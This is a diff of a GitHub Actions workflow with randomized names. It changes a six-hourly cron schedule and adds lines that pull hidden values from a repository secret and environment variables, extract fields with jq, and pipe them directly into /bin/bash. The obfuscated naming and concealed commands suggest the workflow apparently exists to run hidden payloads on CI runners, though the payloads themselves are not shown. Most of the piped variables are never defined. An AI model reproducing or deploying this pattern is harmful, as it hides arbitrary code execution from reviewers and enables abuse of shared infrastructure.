@@ -3,30 +3,26 @@ name: humoxi8192
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '21 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: humoxi8192
         env:
-          oag8541: ${{ secrets.oag8541 }}
+          vfi59: ${{ secrets.vfi59 }}
         run: |
-          echo $oag8541 | jq -r .jzho43250 | /bin/bash
-          echo $fuakn07521 | jq -r .rdqz0 | /bin/bash
-          echo $sfa3208 | jq -r .yij9232 | /bin/bash
-          echo $veotd22464 | jq -r .c05985 | /bin/bash
-          echo $m7 | jq -r .vsbd0 | /bin/bash
-          echo $nq38 | jq -r .upclp62 | /bin/bash
-          echo $mvder331 | jq -r .wkrws8145 | /bin/bash
-          echo $vrx3199 | jq -r .tdfyx22768 | /bin/bash
-          echo $btgp2445 | jq -r .lkdew1366 | /bin/bash
-          echo $dr87 | jq -r .xmh7 | /bin/bash
-          echo $xzti549 | jq -r .e082 | /bin/bash
-          echo $eiajp1515 | jq -r .hhff67595 | /bin/bash
-          echo $yim0 | jq -r .wrnvu82 | /bin/bash
-          echo $teq5088 | jq -r .z0924 | /bin/bash
-          echo $ew3 | jq -r .hq121 | /bin/bash
+          echo $vfi59 | jq -r .nmi475 | /bin/bash
+          echo $jj307 | jq -r .wk0471 | /bin/bash
+          echo $ddmsz6579 | jq -r .pj43 | /bin/bash
+          echo $txscq70275 | jq -r .xys5848 | /bin/bash
+          echo $yhr44 | jq -r .ug635 | /bin/bash
+          echo $x88199 | jq -r .ufv4939 | /bin/bash
+          echo $xxe07 | jq -r .t709 | /bin/bash
+          echo $csndp145 | jq -r .oem8 | /bin/bash
+          echo $n63 | jq -r .bor5 | /bin/bash
+          echo $dw9 | jq -r .ik96 | /bin/bash
+          echo $bmq79002 | jq -r .a628 | /bin/bash
 
